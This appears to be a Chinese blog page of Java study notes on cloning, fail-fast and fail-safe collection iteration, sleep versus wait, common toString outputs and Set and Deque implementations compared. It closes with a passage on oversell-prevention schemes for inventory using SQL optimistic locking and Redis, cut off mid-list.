<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="title">implements</span> <span class="title">Cloneable</span> </span>&#123; <span class="string">``</span>    String name;<span class="keyword">int</span> age; <span class="string">``</span>    Address address; <span class="string">``</span>    public Object clone() throws CloneNotSupportedException &#123;</span><br><span class="line">        Person copy = (Person) super.clone(); <span class="string">``</span>        copy.address = (Address) address.clone(); <span class="regexp">//</span> 深拷贝地址 <span class="string">``</span>        <span class="keyword">return</span> copy; <span class="string">``</span>    &#125; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTk0NDRlN2RiNWVjMDMwYTMyNGViODEzZTg0YzUwYjlfSHNHSkVpVmQ0M1BtSkR0VG1zZElSc2VBQ1RYT3k4WTJfVG9rZW46UldBOWIzd3VJbzJPVk14ZVE0RWNIdGhVbjZkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjViM2E3NTRjNjRmZmJjMmQzNjFkZmU4Y2VkYjRlZDFfMW5iNlA1WnVCYThLaTJKeUNtVGNBZlRGaHV3ZWQzRW9fVG9rZW46QWZrUGJ4UFJ3b2JYTkR4T3dxU2N0TVc1blVkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjUwZWM1MTdkMzhlMjQ1MGQ1NTA5OTIxY2QzY2MwNDRfTDEzZlQ2RG15RWFrQ3R0bTFRWlYyYjRiMFlRTm9NQXhfVG9rZW46VDc0b2JuVkRzb1FkT0h4Z25tR2NoWktVbmxnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="集合中的fail-fast和fail-safe">集合中的fail-fast和fail-safe</h2>
<h3 id="javaguide中描述">javaguide中描述</h3>
<h4 id="fail-fast">fail-fast</h4>
<p>快速失败的思想即针对可能发生的异常进行提前表明故障并停止运行，通过尽早的发现和停止错误，降低故障系统级联的风险。</p>
<p>在<code>java.util</code>包下的大部分集合是不支持线程安全的，为了能够提前发现并发操作导致线程安全风险，提出通过维护一个<code>modCount</code>记录修改的次数，迭代期间通过比对预期修改次数<code>expectedModCount</code>和<code>modCount</code>是否一致来判断是否存在并发操作，从而实现快速失败，由此保证在避免在异常时执行非必要的复杂代码。</p>
<p>对应的我们给出下面这样一段在示例，我们首先插入<code>100</code>个操作元素，一个线程迭代元素，一个线程删除元素，最终输出结果如愿抛出<code>ConcurrentModificationException</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用线程安全的 CopyOnWriteArrayList 避免 ConcurrentModificationException</span></span><br><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="type">CountDownLatch</span> <span class="variable">countDownLatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    list.add(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">    <span class="comment">// 迭代元素 (注意：Integer 是不可变的，这里的 i++ 不会修改 list 中的值)</span></span><br><span class="line">    <span class="keyword">for</span> (Integer i : list) &#123;</span><br><span class="line">        i++; <span class="comment">// 这行代码实际上没有修改list中的元素</span></span><br><span class="line">    &#125;</span><br><span class="line">    countDownLatch.countDown();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;删除元素1&quot;</span>);</span><br><span class="line">    list.remove(Integer.valueOf(<span class="number">1</span>)); <span class="comment">// 使用 Integer.valueOf(1) 删除指定值的对象</span></span><br><span class="line">    countDownLatch.countDown();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">t1.start();</span><br><span class="line">t2.start();</span><br><span class="line">countDownLatch.await();</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTA2ZDg5ZWZiOGQ4YWQ1ODhlYzI0MjRiMmVmYzUzMDNfaUljMzBaUHhnTXczMVY1cmVKVDVNMTh6NmFickFXR1VfVG9rZW46Q0tkVmJzREtmb3dkYnZ4YURFNmNIWlhPbnplXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YWM5MzU1YzQ3ZmJhYmVlODIwYjE0ZGM2MjI1MWE5NWJfUldmSUJMWVNFUUZZbkVWMUVYYTY0a1h6dGFQaWlNTkdfVG9rZW46VGxtVWI2Unl2b2o4STB4UDZQaGNXWDRGbmpiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h4 id="fail-safe">fail-safe</h4>
<p>而<code>fail-safe</code>也就是安全失败的含义，它旨在即使面对意外情况也能恢复并继续运行，这使得它特别适用于不确定或者不稳定的环境：</p>
<p>该思想常运用于并发容器，最经典的实现就是<code>CopyOnWriteArrayList</code>的实现，通过写时复制的思想保证在进行修改操作时复制出一份快照，基于这份快照完成添加或者删除操作后，将<code>CopyOnWriteArrayList</code>底层的数组引用指向这个新的数组空间，由此避免迭代时被并发修改所干扰所导致并发操作安全问题，当然这种做法也存缺点即进行遍历操作时无法获得实时结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTFiMTQ3MmNkMzIwOGQxMjVjYmZjMTIyN2M3NDViMTBfMDVIOXpNeFBiWEs3aVREYWwxRW9zQXBMZ3BJTHBEM3pfVG9rZW46UWpDRWJzWkF0b3g1QU14VWNHcGNkYmFQbkJjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDE0OWZlOGM2N2JiMjU0MWZkMTEzNjA0NjZiOTI2M2JfRk5vTVY5cHNSUDJFbVpJdUNzd2FyVUw5VEJ2SW5vMW5fVG9rZW46VUZYOGI3a0ZHb1hnSzN4Smk4bWNpN3V1bmlnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">concurrent</span>.<span class="property">CopyOnWriteArrayList</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CopyOnWriteDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="title function_">main</span>(<span class="params"><span class="title class_">String</span>[] args</span>) &#123;</span><br><span class="line">        <span class="title class_">CopyOnWriteArrayList</span>&lt;<span class="title class_">String</span>&gt; list = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;&gt;();</span><br><span class="line">        list.<span class="title function_">add</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        list.<span class="title function_">add</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个线程遍历集合</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;线程1开始遍历：&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="title class_">String</span> s : list) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="title class_">Thread</span>.<span class="title function_">sleep</span>(<span class="number">100</span>); <span class="comment">// 模拟遍历耗时</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="title class_">InterruptedException</span> e) &#123;</span><br><span class="line">                    e.<span class="title function_">printStackTrace</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;遍历元素：&quot;</span> + s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).<span class="title function_">start</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个线程添加元素</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="title class_">Thread</span>.<span class="title function_">sleep</span>(<span class="number">150</span>); <span class="comment">// 确保在遍历过程中执行</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="title class_">InterruptedException</span> e) &#123;</span><br><span class="line">                e.<span class="title function_">printStackTrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            list.<span class="title function_">add</span>(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">            <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;线程2添加了元素 C&quot;</span>);</span><br><span class="line">        &#125;).<span class="title function_">start</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzc5ZmQ0ODM2YTZlMzdhNzMzMDZkNDZkYWJjZGRkODZfU2JpQmp0a0FxU2VQOTdlam1PNWxUZHpraWxFa0NMcGpfVG9rZW46Q3hxemJ1UWNzb1loQ1l4TkNjWWNnVFM0bkViXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="详细解析">详细解析</h3>
<p><code>fail-fast</code> 和 <code>fail-safe</code> 是 Java 中 <strong>集合在并发修改（Concurrent Modification）时的两种不同行为机制</strong>，主要用于描述迭代器在面对集合结构变化时的处理方式。</p>
<h2 id="✅-一句话总结：">✅ 一句话总结：</h2>
<blockquote>
<p><code>fail-fast</code>: <strong>发现结构变更立即抛异常</strong>（如 <code>ConcurrentModificationException</code>） <code>fail-safe</code>: <strong>容忍结构变更，不抛异常，复制快照操作</strong></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NDdlNTc3NTU5MmZhYjU5MGYyYzAzYjQ4N2QwMTAyNDlfQVB0YW9WbWtDekZJZHlWbmJmb2x4RW12THBlZE15akJfVG9rZW46Q0M2a2JoUTI0b2pHZ2N4RmNvSGNLVDlMbklnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWY0MmY4NWNhMTk1YzA0MTUzYWQ3MDA5ZWRiMmI0NDRfaU5aa3lISVpZNVc3SmtweDE1STFremQ2WmZrQVRncHZfVG9rZW46QmI5TGJvVktab09iTzB4cVhOS2NCc250bndkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NmFjOTc4MDVhOGIwNDBjZDM2YzRkYjVjMzUzNTI0MjJfNm1VbTBCSGZiUHhUZGJHR3lRTXh1eGVuSGVNRzR4M2ZfVG9rZW46QTlMUmIzSzRYbzlrcVB4WHJzZmNBTW5lbmZmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2I5OTlmODIzMmExOWMxZGU2NmEwOTBmNTQwMGMwMTBfOEw3QWc3QlJZSWx3UThKWldPZE42aGVPeDF1UzQxbGlfVG9rZW46RVphM2JnYlVnb3c3Y1p4QldDMWNiWVE1bjZiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="❗-fail-fast-原理简述">❗ fail-fast 原理简述</h3>
<ul>
<li>每次你用 <code>Iterator</code> 遍历时，它内部会记录集合的 <code>modCount</code>（修改次数）。</li>
<li>如果在遍历过程中，你直接使用 <code>list.remove(...)</code> 这样的方法修改集合：
<ul>
<li>集合的 <code>modCount</code> 增加了；</li>
<li>但 <code>Iterator</code> 期望 <code>modCount</code> 没变，检查时就会抛出异常。</li>
</ul>
</li>
</ul>
<h3 id="🚫-为什么不能这样做？">🚫 为什么不能这样做？</h3>
<p>因为增强 for 底层是迭代器，但你却跳过了迭代器自己去动集合，<strong>破坏了迭代器的一致性预期</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">List</span>&lt;<span class="title class_">String</span>&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">list.<span class="title function_">add</span>(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">list.<span class="title function_">add</span>(<span class="string">&quot;Python&quot;</span>);</span><br><span class="line">list.<span class="title function_">add</span>(<span class="string">&quot;C++&quot;</span>);</span><br><span class="line">list.<span class="title function_">add</span>(<span class="string">&quot;Go&quot;</span>); <span class="comment">// 添加多一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="title class_">String</span> item : list) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;Python&quot;</span>.<span class="title function_">equals</span>(item)) &#123;</span><br><span class="line">        list.<span class="title function_">remove</span>(item); <span class="comment">// 修改 modCount</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;当前元素：&quot;</span> + item); <span class="comment">// 下一次 next() 被调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时必定抛出异常，因为 next() 还会尝试访问 &quot;Go&quot;。</span></span><br><span class="line"><span class="comment">//异常：Exception in thread &quot;main&quot; java.util.ConcurrentModificationException</span></span><br><span class="line"></span><br><span class="line">✅ 正确写法（避免 fail-fast）：</span><br><span class="line"><span class="title class_">Iterator</span>&lt;<span class="title class_">String</span>&gt; it = list.<span class="title function_">iterator</span>();</span><br><span class="line"><span class="keyword">while</span> (it.<span class="title function_">hasNext</span>()) &#123;</span><br><span class="line">    <span class="title class_">String</span> item = it.<span class="title function_">next</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;Python&quot;</span>.<span class="title function_">equals</span>(item)) &#123;</span><br><span class="line">        it.<span class="title function_">remove</span>(); <span class="comment">// 安全 ✅</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sleep和wait的区别">sleep和wait的区别</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjAwZjM1MzMwZTJlYjk5MmRkZDY3MzNiYWNjMTc2MzJfVlRLNEw0OXBFU01XdTM0R09NaXlEUkdkRk1rY3dtdTNfVG9rZW46T1JRTWI4MFNZb21mdkp4c21NMGNVRGc1bjZjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjQ5NzEwMWIyMjgwYjg1YTMzM2IzNmVmMGMxNDlkYWVfSEdLRUhuclBTYmxLNDBDc3JQOWNtd0tOVDhZMEhYdEdfVG9rZW46Vk05dmJFb1Qyb1pDQ0l4ZGVpdWNGN0VYbnpnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2JiNjUzNTg4OGVjNzMyNTQzODA5MjBhNWU5YzdmYjRfSUNjTVFhcXV2NHhpdk5OMVFLRWVFeHBnb244SXRtdVNfVG9rZW46UHA0a2JjYzFIb1NFWEN4MTJGQ2NXTVRnbmFiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-示例背景：两个线程尝试获取同一个锁">✅ 示例背景：两个线程尝试获取同一个锁</h2>
<p>我们创建两个线程 <code>T1</code> 和 <code>T2</code>，都尝试获取对象 <code>lock</code> 的锁。我们分别用 <code>sleep()</code> 和 <code>wait()</code> 来看看效果的不同。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmQ5OGE4MTAzMGViOTNmYmYzNWFhYTU5MzBmMGU4NjJfT1B4VW9wa3gzUU5YN085Y3J1YTEyaUdYTmZyVUNGRVhfVG9rZW46SmtaNWJudW1wb21PT0F4U1ZHUWNXVUM1bnZkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWM0YTdmMjI2NjkzZjA1NzhhMWIwZWQ4MWRkNGZhNzlfOXAzS2FOUXFSa1dQYlQyYUNxalR3VlZQSnB1c1NTeERfVG9rZW46RUdFQmI0ajROb0p2VVR4RFR6V2N2bXFYblJiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjkzOWRmMjZiMmU5Y2MwZTRmNTA3NmI2OTRlNDgzMDFfZ0pwNllYVlo5endKQkdRVGNlVFBTS0NZZ0VYUEhVM2pfVG9rZW46UzZWdmJjM3p0b0RzMU94eFpxVmMxUk0wbnpiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="Java-常见类中已重写-toString-方法一览表">Java 常见类中已重写 <code>toString()</code> 方法一览表</h2>
<table>
<thead>
<tr>
<th>类别</th>
<th>类名</th>
<th>示例输出或说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>集合类</td>
<td>ArrayList, LinkedList</td>
<td>[a, b, c]（元素顺序输出）</td>
</tr>
<tr>
<td></td>
<td>HashSet, TreeSet</td>
<td>[b, a, c]（Set 输出无重复）</td>
</tr>
<tr>
<td></td>
<td>HashMap, TreeMap, Hashtable</td>
<td>{key1=value1, key2=value2}（key-value 显示）</td>
</tr>
<tr>
<td>数组类</td>
<td>—</td>
<td>使用 Arrays.toString() 输出，如 [1, 2, 3]</td>
</tr>
<tr>
<td>字符串类</td>
<td>String, StringBuilder, StringBuffer</td>
<td>输出字符串本身</td>
</tr>
<tr>
<td>包装类</td>
<td>Integer, Double, Float, Boolean, Character</td>
<td>输出值，如 123, true</td>
</tr>
<tr>
<td>日期时间类</td>
<td>Date</td>
<td>Tue May 21 14:23:00 CST 2025（旧类）</td>
</tr>
<tr>
<td></td>
<td>LocalDate, LocalTime</td>
<td>2025-05-21, 14:23:00.123（Java 8+ 新类）</td>
</tr>
<tr>
<td></td>
<td>LocalDateTime, ZonedDateTime</td>
<td>2025-05-21T14:23:00+08:00[Asia/Shanghai]</td>
</tr>
<tr>
<td>异常类</td>
<td>Exception, RuntimeException</td>
<td>错误类型 + 错误信息，如 NullPointerException: msg</td>
</tr>
<tr>
<td>文件系统类</td>
<td>File, Path（Java NIO）</td>
<td>C:\file.txt 或 /home/user/file.txt</td>
</tr>
<tr>
<td>枚举类</td>
<td>所有 enum 类型</td>
<td>输出枚举名，如 MONDAY</td>
</tr>
<tr>
<td>可选类</td>
<td>Optional, OptionalInt</td>
<td>Optional[42]，Optional.empty</td>
</tr>
<tr>
<td>线程类</td>
<td>Thread</td>
<td>Thread[main,5,main]</td>
</tr>
<tr>
<td>Scanner 类</td>
<td>Scanner</td>
<td>显示扫描器的状态描述</td>
</tr>
<tr>
<td>正则类</td>
<td>Pattern, Matcher</td>
<td>正则表达式本身或匹配状态</td>
</tr>
<tr>
<td>UUID 类</td>
<td>UUID</td>
<td>550e8400-e29b-41d4-a716-446655440000</td>
</tr>
<tr>
<td>基本数学类</td>
<td>BigInteger, BigDecimal</td>
<td>十进制字符串表示，如 1234567890123456789</td>
</tr>
<tr>
<td>集合工具类</td>
<td>Collections.unmodifiableList()</td>
<td>和普通集合一样 [1, 2, 3]</td>
</tr>
</tbody>
</table>
<h2 id="比较-HashSet、LinkedHashSet-和-TreeSet-三者的异同">比较 HashSet、LinkedHashSet 和 TreeSet 三者的异同</h2>
<ul>
<li><code>HashSet</code>、<code>LinkedHashSet</code> 和 <code>TreeSet</code> 都是 <code>Set</code> 接口的实现类，都能保证元素唯一，并且都不是线程安全的。</li>
<li><code>HashSet</code>、<code>LinkedHashSet</code> 和 <code>TreeSet</code> 的主要区别在于底层数据结构不同。<code>HashSet</code> 的底层数据结构是哈希表（基于 <code>HashMap</code> 实现）。<code>LinkedHashSet</code> 的底层数据结构是链表和哈希表，元素的插入和取出顺序满足 FIFO。<code>TreeSet</code> 底层数据结构是红黑树，元素是有序的，排序的方式有自然排序和定制排序。</li>
<li>底层数据结构不同又导致这三者的应用场景不同。<code>HashSet</code> 用于不需要保证元素插入和取出顺序的场景，<code>LinkedHashSet</code> 用于保证元素的插入和取出顺序满足 FIFO 的场景，<code>TreeSet</code> 用于支持对元素自定义排序规则的场景。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDQzNTczMzIzNDgwYTAxNjYwYmMwY2ZkNmVkZjlhZWVfa1VDTUZIMUY5YnRQODN3dFRPNGFjdTdUWFNoaWdySzdfVG9rZW46T1Jtd2JEU3pTb1RlZGN4RGhlbGN6Y0dLbkRkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="ArrayDeque-与-LinkedList-的区别">ArrayDeque 与 LinkedList 的区别</h2>
<p><code>ArrayDeque</code> 和 <code>LinkedList</code> 都实现了 <code>Deque</code> 接口，两者都具有队列的功能，但两者有什么区别呢？</p>
<ul>
<li><code>ArrayDeque</code> 是基于可变长的数组和双指针来实现，而 <code>LinkedList</code> 则通过链表来实现。</li>
<li><code>ArrayDeque</code> 不支持存储 <code>NULL</code> 数据，但 <code>LinkedList</code> 支持。</li>
<li><code>ArrayDeque</code> 是在 JDK1.6 才被引入的，而<code>LinkedList</code> 早在 JDK1.2 时就已经存在。</li>
<li><code>ArrayDeque</code> 插入时可能存在扩容过程, 不过均摊后的插入操作依然为 O(1)。虽然 <code>LinkedList</code> 不需要扩容，但是每次插入数据时均需要申请新的堆空间，均摊性能相比更慢。</li>
</ul>
<p>从性能的角度上，选用 <code>ArrayDeque</code> 来实现队列要比 <code>LinkedList</code> 更好。此外，<code>ArrayDeque</code> 也可以用于实现栈。</p>
<blockquote>
<p>ArrayDeque 快又省，但不让放 null；</p>
<p>LinkedList 插入稳，链多占内存多;</p>
</blockquote>
<h1>12306</h1>
<h2 id="三种常见库存扣减技术方案（防止超卖）">三种常见库存扣减技术方案（防止超卖）</h2>
<h2 id="✅-一、数据库乐观锁方案">✅ 一、数据库乐观锁方案</h2>
<h3 id="🧩-适用场景：">🧩 适用场景：</h3>
<ul>
<li>普通电商库存扣减</li>
<li>中低并发、对性能要求一般、追求数据强一致</li>
</ul>
<h3 id="🔁-流程说明：">🔁 流程说明：</h3>
<ol>
<li>用户点击购买商品</li>
<li>应用查询数据库中某商品库存为 5</li>
<li>应用尝试执行如下 SQL：</li>
<li><code>UPDATE product_stock </code> <code>SET stock = stock - 1  ``WHERE product_id = 123 AND stock &gt;= 1</code></li>
<li>SQL 执行成功（受影响行数 = 1），表示库存足够 → 下单成功</li>
<li>若库存不足 → SQL 无更新 → 报库存不足异常</li>
</ol>
<h3 id="✅-优点：-3">✅ 优点：</h3>
<ul>
<li>不依赖中间件，原生 SQL 实现，强一致性</li>
<li>数据准确，不会超卖</li>
</ul>
<h3 id="❌-缺点：-5">❌ 缺点：</h3>
<ul>
<li>并发高时存在行锁竞争，性能瓶颈明显</li>
<li>高并发秒杀场景下数据库扛不住</li>
</ul>
<h2 id="✅-二、Redis-缓存扣减方案">✅ 二、Redis 缓存扣减方案</h2>
<h3 id="🧩-适用场景：-2">🧩 适用场景：</h3>
<ul>
<li>高频访问、高并发场景（如秒杀活动）</li>
<li>允许最终一致性，可接受短时间数据不一致</li>
</ul>
<h3 id="🔁-流程说明：-2">🔁 流程说明：</h3>
<ol>
<li>秒杀前将商品库存预热至 Redis：</li>
<li><code>SET stock:123 = 100</code></li>
<li>用户点击秒杀，应用执行 Redis 操作：</li>
<li><code>DECRBY stock:123 1</code></li>
<li>若结果 ≥ 0 → 说明扣减成功</li>
<li>接下来异步发送消息至消息队列（如 RocketMQ）进行：
<ol>
<li>数据库持久化扣减</li>
